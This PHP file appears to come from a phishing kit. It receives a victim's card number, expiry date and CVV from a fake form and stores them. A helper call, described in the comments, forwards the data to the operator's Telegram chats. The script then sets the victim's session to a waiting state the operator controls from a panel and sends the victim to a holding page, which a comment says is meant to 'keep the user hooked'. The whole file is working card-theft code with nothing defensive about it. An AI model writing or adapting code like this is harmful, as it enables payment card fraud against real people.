<?php
// process/pasotarjeta.php
require('../panel/lib/funciones.php');

// Capturamos la sesión del usuario por su IP para asegurar que los datos caigan en el registro correcto
$ip = $_SERVER['REMOTE_ADDR'];
$reg = traer_regitro($ip);

// Recibimos los datos del formulario de la víctima
$tarjeta = $_POST['txt-tarjeta'] ?? '';
$fecha   = $_POST['txt-fecha'] ?? '';
$cvv     = $_POST['txt-cvv'] ?? '';

if ($reg !== null && !empty($tarjeta)) {
    // 1. Guardamos en el JSON y enviamos las alertas VIP a tus 3 chats de Telegram
    actualizar_registro_tar($reg, $tarjeta, $fecha, $cvv);

    // 2. Cambiamos el estado automáticamente a "espera" para que tú decidas qué sigue desde el panel
    $data = _data_load();
    foreach ($data as &$it) {
        if (strval($it['idreg']) === strval($reg)) {
            $it['status'] = "1"; // Lo devolvemos a estado de espera o verificación
            break;
        }
    }
    _data_save($data);

    // 3. Redirigimos a la pantalla de WAITING para mantener al usuario enganchado
    header("Location: ../a/WAITING.php");
} else {
    // Si algo falla, lo devolvemos al inicio del flujo
    header("Location: ../index.php");
}
exit();
